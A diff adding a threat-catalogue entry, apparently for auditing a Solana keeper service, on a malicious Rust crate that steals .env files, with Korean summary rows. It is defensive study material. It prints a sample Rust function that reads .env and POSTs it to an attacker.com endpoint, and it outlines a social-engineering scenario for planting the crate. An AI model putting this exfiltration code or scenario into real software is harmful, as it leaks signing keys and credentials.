@@ -826,3 +826,37 @@ require!(
 | B44 SPL Token Account Persistent Delegate Drain | 계정 소유권(owner)과 위임 권한(delegate)의 분리를 감사가 "정상 Solana 토큰 모델"로 취급하여 dApp 사용 후 delegate 잔존을 별도 공격 벡터로 분류하지 않음. 프로토콜 감사는 vault ATA 보안에 집중하고, 사용자 측 ATA delegate가 프로토콜 mint 흐름을 통해 세탁 경로로 악용될 수 있음을 수신 측에서 거부해야 한다는 점을 놓침 (Ledger/Canissolana 2026-03-02). |
 
 
+
+### A44. Utility-Impersonating Env-Stealer Crate
+**Signal**: RUSTSEC-2026-0030 (`time_calibrator`, March 3, 2026) — malicious crate removed from crates.io after being reported for uploading `.env` files to an attacker-controlled server. Published 2026-02-28; one version only; zero declared dependents. Named to sound like legitimate infrastructure tooling.
+**Mechanism**: A developer adds a plausibly-named Rust crate to `Cargo.toml` (e.g., `time_calibrator` for a keeper that needs clock sync, `tracing-ext` for telemetry, `rpc-utils` for RPC helpers). At `cargo build` or runtime initialization, the crate silently reads the `.env` file in the working directory (or known operator paths like `~/.env`, `./secrets/.env`) and HTTP-POSTs its contents to an attacker-controlled endpoint. Unlike typosquat attacks (A-series, name-collision) and transitive relay (D33, hidden in transitive deps), this is a standalone, directly-added dependency with a first-impression-legitimate name.
+**Distinct from existing entries**:
+- **Typosquat Waves** (solana-specific.md): Name-confusion with well-known crate (e.g., `rpc-check` vs `rpc`). A44 is a fresh-named crate, no name collision.
+- **D33 Transitive Payload Relay**: Payload hidden in transitive dep of a legitimate crate. A44 is the dependency itself.
+- **A44 unique**: First-party addition of a seemingly useful tool crate whose sole purpose is credential exfiltration at build/install time.
+**Code pattern to find**:
+```toml
+# DANGEROUS: adding a new, low-download-count crate for a utility purpose
+[dependencies]
+time_calibrator = "0.1.0"   # "time sync utility" — actually env stealer
+```
+```rust
+// Inside time_calibrator 0.1.0:
+fn init() {
+    if let Ok(content) = std::fs::read_to_string(".env") {
+        let _ = reqwest::blocking::Client::new()
+            .post("http://attacker.com/collect")
+            .body(content).send();
+    }
+}
+```
+**Microstable relevance**: HIGH (Keeper). Keeper binary runs with `/home/spritz/microstable-keeper/.env` containing signing private keys. `check_dotenv_permissions()` enforces mode 600 (external reads blocked) but does NOT prevent a dependency running within the same process from calling `std::fs::read_to_string()` on the `.env` path (same-process same-UID access). `EMBEDDED_CARGO_LOCK_SHA256` detects unexpected lock changes only if hash is verified — deliberate merge bypasses this. If attacker exfiltrates keeper `.env`, they gain: (1) keeper signing key → malicious oracle updates, circuit-breaker disabling; (2) RPC credentials; (3) HMAC state key → forge keeper state.
+**PoC scenario**:
+1. Attacker registers `time-calibrator-solana` (or similar) on crates.io with a 50-line utility wrapper and a hidden `build.rs` / `lib.rs` env-file upload.
+2. Social-engineers a keeper operator via PR or Slack: "use this for keeper slot-time calibration."
+3. Developer adds it to `Cargo.toml`; `cargo build` fires; `.env` is uploaded silently.
+4. Attacker extracts private key, issues malicious keeper transactions before detection.
+**Defense**: Cargo.lock hash attestation (CI rejects non-approved lock changes); mandatory 7-day quarantine for new crates; `cargo deny check bans` policy; do NOT run `cargo build` with `.env` in working directory; move keeper secrets to `--secret-file` arg with restricted path that cannot be found by working-directory `.env` scan; add `deny_unknown_fields` checks on new deps in CI.
+**Source**: https://rustsec.org/advisories/RUSTSEC-2026-0030.html (RUSTSEC-2026-0030, March 3, 2026)
+
+| A44 Utility-Impersonating Env-Stealer Crate | 신규 크레이트를 "유용한 유틸리티"로 직접 추가할 때, 작업 디렉토리나 알려진 운영 경로의 `.env` 파일을 읽어 공격자 서버에 업로드하는 인라인 페이로드를 포함하는 위협을 검토 범위에서 제외. 타이포스쿼트(이름 혼동)·전이 의존성 릴레이와 달리, 직접 추가된 1차 의존성이 공격 매체. `check_dotenv_permissions()` 600모드 강제는 외부 읽기 차단이지만 동일 프로세스 내 의존성 접근은 방지 못함 (RUSTSEC-2026-0030, time_calibrator, 2026-03-03). |
